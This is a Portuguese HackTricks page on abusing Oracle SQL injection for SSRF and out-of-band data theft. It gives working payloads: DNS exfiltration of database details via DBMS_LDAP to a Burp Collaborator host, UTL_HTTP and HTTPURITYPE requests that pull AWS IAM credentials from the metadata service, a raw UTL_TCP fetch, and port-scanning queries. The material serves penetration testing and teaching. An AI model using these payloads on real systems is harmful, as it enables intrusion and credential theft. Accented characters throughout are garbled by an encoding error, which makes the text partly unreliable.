# Inje√ß√£o Oracle

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios github do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## SSRF

Usar Oracle para fazer requisi√ß√µes HTTP e DNS Out of Band √© bem documentado, mas como meio de exfiltrar dados SQL em inje√ß√µes. Podemos sempre modificar essas t√©cnicas/fun√ß√µes para fazer outros SSRF/XSPA.

Instalar Oracle pode ser realmente doloroso, especialmente se voc√™ quer configurar uma inst√¢ncia r√°pida para testar comandos. Meu amigo e colega na [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), me indicou [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) que me permitiu configurar uma inst√¢ncia em uma m√°quina AWS Ubuntu t2.large com Docker.

Eu executei o comando docker com a flag `--network="host"` para que eu pudesse simular o Oracle como uma instala√ß√£o nativa com acesso total √† rede, para o decorrer deste post no blog.
```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c
```
#### Pacotes Oracle que suportam especifica√ß√£o de URL ou Hostname/N√∫mero de Porta <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

Para encontrar pacotes e fun√ß√µes que suportam especifica√ß√£o de host e porta, realizei uma pesquisa no Google na [Documenta√ß√£o Online do Oracle Database](https://docs.oracle.com/database/121/index.html). Especificamente,
```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```
A pesquisa retornou os seguintes resultados (nem todos podem ser usados para realizar rede externa)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

Esta pesquisa bruta obviamente ignora pacotes como `DBMS_LDAP` (que permite passar um nome de host e n√∫mero de porta) j√° que [a p√°gina de documenta√ß√£o](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simplesmente te direciona para um [local diferente](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Portanto, pode haver outros pacotes Oracle que podem ser abusados para fazer solicita√ß√µes externas que eu possa ter perdido.

De qualquer forma, vamos dar uma olhada em alguns dos pacotes que descobrimos e listamos acima.

**DBMS\_LDAP.INIT**

O pacote `DBMS_LDAP` permite o acesso a dados de servidores LDAP. A fun√ß√£o `init()` inicializa uma sess√£o com um servidor LDAP e recebe um nome de host e n√∫mero de porta como argumento.

Esta fun√ß√£o foi documentada anteriormente para mostrar a exfiltra√ß√£o de dados por DNS, como abaixo
```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```
```markdown
No entanto, dado que a fun√ß√£o aceita um nome de host e um n√∫mero de porta como argumentos, voc√™ pode usar isso para funcionar como um scanner de porta tamb√©m.

Aqui est√£o alguns exemplos
```
```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```
Um `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` indica que a porta est√° fechada enquanto um valor de sess√£o aponta para a porta estar aberta.

**UTL\_SMTP**

O pacote `UTL_SMTP` √© projetado para enviar e-mails via SMTP. O exemplo fornecido no [site de documenta√ß√£o da Oracle mostra como voc√™ pode usar este pacote para enviar um e-mail](https://docs.oracle.com/database/121/ARPLS/u_smtp.htm#ARPLS71478). Para n√≥s, no entanto, o interessante √© a capacidade de fornecer uma especifica√ß√£o de host e porta.

Um exemplo simples √© mostrado abaixo com a fun√ß√£o `UTL_SMTP.OPEN_CONNECTION`, com um tempo limite de 2 segundos
```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```
Um `ORA-29276: transfer timeout` indica que a porta est√° aberta, mas n√£o foi estabelecida conex√£o SMTP, enquanto um `ORA-29278: SMTP transient error: 421 Service not available` indica que a porta est√° fechada.

**UTL\_TCP**

O pacote `UTL_TCP` e seus procedimentos e fun√ß√µes permitem [comunica√ß√£o baseada em TCP/IP com servi√ßos](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Se programado para um servi√ßo espec√≠fico, esse pacote pode facilmente se tornar uma entrada na rede ou realizar Solicita√ß√µes de Lado do Servidor completas, pois todos os aspectos de uma conex√£o TCP/IP podem ser controlados.

O exemplo [no site de documenta√ß√£o da Oracle mostra como voc√™ pode usar este pacote para fazer uma conex√£o TCP bruta para buscar uma p√°gina da web](https://docs.oracle.com/cd/B28359_01/appdev.111/b28419/u_tcp.htm#i1004190). Podemos simplificar ainda mais e us√°-lo para fazer solicita√ß√µes √† inst√¢ncia de metadados, por exemplo, ou a um servi√ßo TCP/IP arbitr√°rio.
```
set serveroutput on size 30000;
SET SERVEROUTPUT ON
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
retval pls_integer;
BEGIN
c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
retval := utl_tcp.write_line(c);
BEGIN
LOOP
dbms_output.put_line(utl_tcp.get_line(c, TRUE));
END LOOP;
EXCEPTION
WHEN utl_tcp.end_of_input THEN
NULL;
END;
utl_tcp.close_connection(c);
END;
```
**UTL\_HTTP e Requisi√ß√µes Web**

Talvez a t√©cnica mais comum e amplamente documentada em todos os tutoriais de Inje√ß√£o SQL Oracle Out of Band seja o [pacote `UTL_HTTP`](https://docs.oracle.com/database/121/ARPLS/u_http.htm#ARPLS070). Este pacote √© definido pela documenta√ß√£o como - `O pacote UTL_HTTP permite chamadas do Protocolo de Transfer√™ncia de Hipertexto (HTTP) a partir de SQL e PL/SQL. Voc√™ pode us√°-lo para acessar dados na Internet via HTTP.`
```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```
Voc√™ tamb√©m pode usar isso para realizar varreduras de portas rudimentares com consultas como
```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```
Um `ORA-12541: TNS:no listener` ou um `TNS:operation timed out` √© um sinal de que a porta TCP est√° fechada, enquanto um `ORA-29263: HTTP protocol error` ou dados s√£o um sinal de que a porta est√° aberta.

Outro pacote que usei no passado com sucesso variado √© o m√©todo [`GETCLOB()` do tipo abstrato `HTTPURITYPE` do Oracle](https://docs.oracle.com/database/121/ARPLS/t_dburi.htm#ARPLS71705) que permite interagir com uma URL e oferece suporte para o protocolo HTTP. O m√©todo `GETCLOB()` √© usado para buscar a resposta GET de uma URL como um [tipo de dados CLOB.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html) [select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><strong>Aprenda hacking no AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se voc√™ quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**merchandising oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** üí¨ [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas t√©cnicas de hacking enviando PRs para os reposit√≥rios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
